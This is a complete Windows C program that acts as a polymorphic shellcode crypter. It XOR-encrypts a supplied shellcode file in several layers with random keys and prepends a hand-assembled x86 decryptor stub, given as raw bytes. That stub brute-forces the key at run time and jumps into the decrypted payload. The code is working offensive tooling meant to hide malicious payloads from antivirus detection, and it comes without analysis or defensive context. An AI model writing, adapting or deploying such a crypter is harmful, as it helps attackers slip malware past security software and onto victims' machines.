#define _CRT_RAND_S
#include <Windows.h>

typedef struct _dec_info
{
	UINT32 shell_size;
	UINT32 check_bytes;
} dec_info;

/*unsigned char decryptor[106] = {
	0x55, 0x53, 0x8B, 0xEC, 0x83, 0xEC, 0x20, 0xB9, 0xEF, 0xBE, 0xAD, 0xDE,
	0xE8, 0x51, 0x00, 0x00, 0x00, 0x89, 0x04, 0x24, 0x8B, 0x1C, 0x24, 0x43, 0x39, 0x0B, 0x75, 0xFB,
	0x8B, 0x4B, 0x04, 0x89, 0x4C, 0x24, 0x04, 0x8B, 0x4B, 0x08, 0x89, 0x4C, 0x24, 0x08, 0x83, 0xC3,
	0x0C, 0x89, 0x5C, 0x24, 0x0C, 0x33, 0xDB, 0x8B, 0x54, 0x24, 0x0C, 0x8B, 0x12, 0x33, 0xD3, 0x3B,
	0x54, 0x24, 0x08, 0x74, 0x03, 0x43, 0xEB, 0xEF, 0x89, 0x5C, 0x24, 0x10, 0x8B, 0x54, 0x24, 0x0C,
	0x33, 0xC9, 0x31, 0x1C, 0x0A, 0x3B, 0x4C, 0x24, 0x04, 0x7D, 0x05, 0x83, 0xC1, 0x04, 0xEB, 0xF2,
	0x8B, 0xE5, 0x5D, 0x5B, 0xFF, 0xE2, 0x8B, 0x04, 0x24, 0xC3, 0xEF, 0xBE, 0xAD, 0xDE
};*/

unsigned char decryptor[109] = {
	0x55, 0x53, 0x8B, 0xEC, 0x83, 0xEC, 0x20, 0xB9, 0xEF, 0xBE, 0xAD, 0xDE,
	0xE8, 0x54, 0x00, 0x00, 0x00, 0x89, 0x04, 0x24, 0x8B, 0x1C, 0x24, 0x43, 0x39, 0x0B, 0x75, 0xFB,
	0x8B, 0x4B, 0x04, 0x89, 0x4C, 0x24, 0x04, 0x8B, 0x4B, 0x08, 0x89, 0x4C, 0x24, 0x08, 0x83, 0xC3,
	0x0C, 0x89, 0x5C, 0x24, 0x0C, 0x33, 0xDB, 0x8B, 0x54, 0x24, 0x0C, 0x8B, 0x12, 0x33, 0xD3, 0x3B,
	0x54, 0x24, 0x08, 0x74, 0x03, 0x43, 0xEB, 0xEF, 0x89, 0x5C, 0x24, 0x10, 0x90, 0x90, 0x90, 0x8B,
	0x54, 0x24, 0x0C, 0x33, 0xC9, 0x31, 0x1C, 0x0A, 0x3B, 0x4C, 0x24, 0x04, 0x7D, 0x05, 0x83, 0xC1,
	0x04, 0xEB, 0xF2, 0x8B, 0xE5, 0x5D, 0x5B, 0xFF, 0xE2, 0x8B, 0x04, 0x24, 0xC3, 0xEF, 0xBE, 0xAD, 0xDE
};

void enc_buf(char *buf, size_t buf_size, unsigned int key)
{
	char *pkey = (char *)&key;
	size_t i;
	for (i = 0; i < buf_size; i++)
	{
		buf[i] ^= pkey[i % 4];
	}
}

int main(int argc, char *argv[])
{
	if (argc < 4)
		return (1);

	char *shell = argv[1];
	char *out = argv[2];
	int layers = atoi(argv[3]);

	HANDLE file = CreateFileA(shell, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
	if (file == INVALID_HANDLE_VALUE)
		return (1);

	size_t shell_size = GetFileSize(file, 0);
	if (shell_size == INVALID_FILE_SIZE)
	{
		CloseHandle(file);
		return (1);
	}
	
	char *shell_buf = HeapAlloc(GetProcessHeap(), 0, shell_size);
	if (shell_buf == NULL)
	{
		CloseHandle(file);
		return (1);
	}

	size_t num_read;
	if (ReadFile(file, shell_buf, shell_size, &num_read, 0) == 0)
	{
		CloseHandle(file);
		HeapFree(GetProcessHeap(), 0, shell_buf);
		return (1);
	}

	CloseHandle(file);
	char *work_buf;
	while (1)
	{
		unsigned int key;
		rand_s(&key);

		dec_info info;
		info.check_bytes = *(DWORD *)shell_buf;
		info.shell_size = shell_size;

		work_buf = HeapAlloc(GetProcessHeap(), 0, shell_size + sizeof(dec_info) + sizeof(decryptor));
		if (work_buf == NULL)
			exit(1);

		memcpy(work_buf, decryptor, sizeof(decryptor));
		memcpy(work_buf + sizeof(decryptor), &info, sizeof(info));
		memcpy(work_buf + sizeof(decryptor) + sizeof(info), shell_buf, shell_size);

		enc_buf(work_buf + sizeof(decryptor) + sizeof(info), shell_size, key);

		HeapFree(GetProcessHeap(), 0, shell_buf);
		shell_buf = work_buf;
		shell_size = shell_size + sizeof(dec_info) + sizeof(decryptor);
		if (layers-- == 0)
			break;
	}

	HANDLE hout = CreateFileA(out, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hout == INVALID_HANDLE_VALUE)
		exit(1);

	DWORD written;
	if (WriteFile(hout, shell_buf, shell_size, &written, 0) == 0)
		exit(1);

	CloseHandle(hout);

	return (0);
}